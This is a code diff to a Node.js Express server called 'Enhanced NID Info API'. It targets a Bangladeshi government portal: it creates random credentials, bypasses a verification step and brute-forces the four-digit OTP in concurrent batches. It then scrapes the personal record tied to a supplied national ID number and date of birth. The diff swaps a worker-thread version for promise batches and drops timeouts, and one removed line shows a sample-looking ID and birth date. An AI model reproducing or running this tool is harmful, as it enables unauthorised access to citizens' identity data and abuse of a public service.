@@ -1,8 +1,6 @@
 const express = require('express');
 const axios = require('axios');
 const cors = require('cors');
-const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
-const path = require('path');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -14,10 +12,8 @@ app.use(express.json());
 // Configuration
 const MOBILE_PREFIX = "016";
 const BATCH_SIZE = 500;
-const MAX_WORKERS = 500; 
+const MAX_WORKERS = 100;
 const TARGET_LOCATION = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form";
-const OTP_ATTEMPT_TIMEOUT = 60000; 
-const BATCH_TOTAL_TIMEOUT = 60000; 
 
 // Enhanced headers from Python code
 const BASE_HEADERS = {
@@ -127,8 +123,7 @@ async function tryOTP(session, cookies, otp) {
         const response = await session.post(url, data, {
             maxRedirects: 0,
             validateStatus: null,
-            headers: headers,
-            timeout: OTP_ATTEMPT_TIMEOUT
+            headers: headers
         });
 
         if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
@@ -140,166 +135,18 @@ async function tryOTP(session, cookies, otp) {
     }
 }
 
-// Worker thread processing function
-function createWorker(workerBatch, cookies, workerId) {
-    return new Promise((resolve, reject) => {
-        const workerCode = `
-            const { parentPort, workerData } = require('worker_threads');
-            const axios = require('axios');
-            
-            const BASE_HEADERS = ${JSON.stringify(BASE_HEADERS)};
-            const OTP_ATTEMPT_TIMEOUT = ${OTP_ATTEMPT_TIMEOUT};
-            const TARGET_LOCATION = "${TARGET_LOCATION}";
-            
-            async function tryOTP(session, cookies, otp) {
-                try {
-                    const url = 'https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step';
-                    
-                    const headers = {
-                        ...BASE_HEADERS,
-                        'Content-Type': 'application/x-www-form-urlencoded',
-                        'Cookie': cookies.join('; '),
-                        'Referer': 'https://fsmms.dgf.gov.bd/bn/step1/mov-verification'
-                    };
-
-                    const data = {
-                        "otpDigit1": otp[0],
-                        "otpDigit2": otp[1],
-                        "otpDigit3": otp[2],
-                        "otpDigit4": otp[3]
-                    };
-
-                    const response = await session.post(url, data, {
-                        maxRedirects: 0,
-                        validateStatus: null,
-                        headers: headers,
-                        timeout: OTP_ATTEMPT_TIMEOUT
-                    });
-
-                    if (response.status === 302 && response.headers.location && response.headers.location.includes(TARGET_LOCATION)) {
-                        return otp;
-                    }
-                    return null;
-                } catch (error) {
-                    return null;
-                }
-            }
-
-            (async () => {
-                const { otpBatch, cookies, workerId } = workerData;
-                const session = axios.create({
-                    headers: {
-                        ...BASE_HEADERS,
-                        'Cookie': cookies.join('; ')
-                    },
-                    timeout: OTP_ATTEMPT_TIMEOUT
-                });
-
-                try {
-                    for (let i = 0; i < otpBatch.length; i++) {
-                        const otp = otpBatch[i];
-                        const result = await tryOTP(session, cookies, otp);
-                        if (result) {
-                            parentPort.postMessage({ 
-                                foundOTP: result,
-                                workerId: workerId 
-                            });
-                            return;
-                        }
-                    }
-                    parentPort.postMessage({ 
-                        foundOTP: null,
-                        workerId: workerId 
-                    });
-                } catch (error) {
-                    parentPort.postMessage({ 
-                        error: error.message,
-                        workerId: workerId 
-                    });
-                }
-            })();
-        `;
-
-        const worker = new Worker(workerCode, {
-            eval: true,
-            workerData: {
-                otpBatch: workerBatch,
-                cookies: cookies,
-                workerId: workerId
-            }
-        });
-
-        worker.on('message', (message) => {
-            if (message.foundOTP) {
-                resolve(message.foundOTP);
-                worker.terminate();
-            } else if (message.error) {
-                reject(new Error(`Worker ${workerId} error: ${message.error}`));
-            } else {
-                resolve(null);
-            }
-        });
-
-        worker.on('error', (error) => {
-            reject(error);
-        });
-
-        worker.on('exit', (code) => {
-            if (code !== 0) {
-                reject(new Error(`Worker ${workerId} stopped with exit code ${code}`));
-            }
-        });
-    });
-}
-
-async function tryBatchWithWorkers(cookies, otpBatch, maxWorkers = 500) {
-    const batchSize = Math.ceil(otpBatch.length / maxWorkers);
-    const workers = [];
+// Enhanced batch processing with concurrency
+async function tryBatch(session, cookies, otpBatch) {
+    const promises = otpBatch.map(otp => tryOTP(session, cookies, otp));
     
-
-    for (let i = 0; i < maxWorkers; i++) {
-        const start = i * batchSize;
-        const end = start + batchSize;
-        const workerBatch = otpBatch.slice(start, end);
-        
-        if (workerBatch.length === 0) continue;
-
-        workers.push(
-            createWorker(workerBatch, cookies, i + 1)
-                .catch(error => {
-                    console.error(`Worker ${i + 1} error:`, error.message);
-                    return null;
-                })
-        );
+    for (let i = 0; i < promises.length; i++) {
+        const result = await promises[i];
+        if (result) {
+            // Cancel other requests if OTP found
+            return result;
+        }
     }
-
-    
-    return new Promise((resolve) => {
-        let completed = 0;
-        let found = false;
-
-        workers.forEach((workerPromise, index) => {
-            workerPromise.then(result => {
-                completed++;
-                
-                if (result && !found) {
-                    found = true;
-                    console.log(`Worker ${index + 1} found OTP: ${result}`);
-                    resolve(result);
-                } else if (completed === workers.length && !found) {
-                    console.log('All completed, OTP not found');
-                    resolve(null);
-                }
-            });
-        });
-
-        
-        setTimeout(() => {
-            if (!found) {
-                resolve(null);
-            }
-        }, BATCH_TOTAL_TIMEOUT);
-    });
+    return null;
 }
 
 async function fetchFormData(session, cookies) {
@@ -389,10 +236,9 @@ app.get('/', (req, res) => {
         },
         features: {
             enhancedHeaders: true,
-            parallelWorkers: true,
+            concurrentOTP: true,
             improvedPasswordGeneration: true,
-            mobilePrefix: MOBILE_PREFIX,
-            maxWorkers: MAX_WORKERS
+            mobilePrefix: MOBILE_PREFIX
         }
     });
 });
@@ -405,28 +251,48 @@ app.get('/get-info', async(req, res) => {
             return res.status(400).json({ error: 'NID and DOB are required' });
         }
 
-        const startTime = Date.now();
+        console.log(`Processing request for NID: ${nid}, DOB: ${dob}`);
 
+        // Generate random credentials with enhanced password
         const password = randomPassword();
         const mobile = randomMobile(MOBILE_PREFIX);
 
-        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);
+        console.log(`Using Mobile: ${mobile}`);
+        console.log(`Using Password: ${password}`);
 
+        // 1. Get session and bypass initial verification
+        console.log('Step 1: Getting session and bypassing verification...');
+        const { session, cookies } = await getSessionAndBypass(nid, dob, mobile, password);
+        console.log('✓ Initial bypass successful');
+
+        // 2. Generate and shuffle OTPs
+        console.log('Step 2: Generating OTP range...');
         let otpRange = generateOTPRange();
 
-      
+        // Enhanced shuffling
         for (let i = otpRange.length - 1; i > 0; i--) {
             const j = Math.floor(Math.random() * (i + 1));
             [otpRange[i], otpRange[j]] = [otpRange[j], otpRange[i]];
         }
-        let foundOTP = await tryBatchWithWorkers(cookies, otpRange, MAX_WORKERS);
 
-        const endTime = Date.now();
-        const duration = (endTime - startTime) / 1000;
+        // 3. Try OTPs in batches with enhanced concurrency
+        console.log('Step 3: Brute-forcing OTP...');
+        let foundOTP = null;
+
+        for (let i = 0; i < otpRange.length; i += BATCH_SIZE) {
+            const batch = otpRange.slice(i, i + BATCH_SIZE);
+            console.log(`Trying batch ${Math.floor(i/BATCH_SIZE) + 1}/${Math.ceil(otpRange.length/BATCH_SIZE)}...`);
+
+            foundOTP = await tryBatch(session, cookies, batch);
+            if (foundOTP) {
+                console.log(`✓ OTP found: ${foundOTP}`);
+                break;
+            }
+        }
 
         if (foundOTP) {
-        
-            console.log('Fetching form data...');
+            // 4. Fetch form data
+            console.log('Step 4: Fetching form data...');
             const html = await fetchFormData(session, cookies);
 
             const ids = [
@@ -439,30 +305,28 @@ app.get('/get-info', async(req, res) => {
             const extractedData = extractFields(html, ids);
             const finalData = enrichData(extractedData.contractorName || "", extractedData, nid, dob);
 
-            console.log(`✅ Success: Data retrieved in ${duration} seconds`);
+            console.log('✓ Success: Data retrieved successfully');
             
+            // Enhanced response with additional info
             res.json({
                 success: true,
                 data: finalData,
                 sessionInfo: {
                     mobileUsed: mobile,
-                    otpFound: foundOTP,
-                    duration: `${duration} seconds`
+                    otpFound: foundOTP
                 }
             });
 
         } else {
-            console.log(`❌ Error: OTP not found after ${duration} seconds`);
+            console.log('✗ Error: OTP not found');
             res.status(404).json({ 
                 success: false,
-                error: "OTP not found after trying all combinations",
-                duration: `${duration} seconds`,
-                timeoutReached: duration >= (BATCH_TOTAL_TIMEOUT/1000)
+                error: "OTP not found after trying all combinations" 
             });
         }
 
     } catch (error) {
-        console.error('❌ Error:', error.message);
+        console.error('Error:', error.message);
         res.status(500).json({ 
             success: false,
             error: error.message 
@@ -470,22 +334,17 @@ app.get('/get-info', async(req, res) => {
     }
 });
 
-
+// Enhanced health check endpoint
 app.get('/health', (req, res) => {
     res.json({ 
         status: 'OK', 
         timestamp: new Date().toISOString(),
         service: 'Enhanced NID Info API',
-        version: '3.0.0',
-        workers: MAX_WORKERS,
-        timeouts: {
-            perOTPAttempt: `${OTP_ATTEMPT_TIMEOUT/1000} seconds`,
-            totalBatch: `${BATCH_TOTAL_TIMEOUT/1000} seconds`
-        }
+        version: '2.0.0'
     });
 });
 
-
+// New endpoint to test credentials generation
 app.get('/test-creds', (req, res) => {
     const mobile = randomMobile(MOBILE_PREFIX);
     const password = randomPassword();
@@ -497,10 +356,10 @@ app.get('/test-creds', (req, res) => {
     });
 });
 
-
-if (isMainThread) {
-    app.listen(PORT, () => {
-        console.log(`📍 Main endpoint: http://localhost:${PORT}/get-info?nid=8667082708&dob=1962-11-07`);
-    });
-
-}
+// Start server
+app.listen(PORT, () => {
+    console.log(`🚀 Enhanced NID Info API running on port ${PORT}`);
+    console.log(`📍 Main endpoint: http://localhost:${PORT}/get-info?nid=YOUR_NID&dob=YYYY-MM-DD`);
+    console.log(`🔧 Test endpoint: http://localhost:${PORT}/test-creds`);
+    console.log(`❤️  Health check: http://localhost:${PORT}/health`);
+});
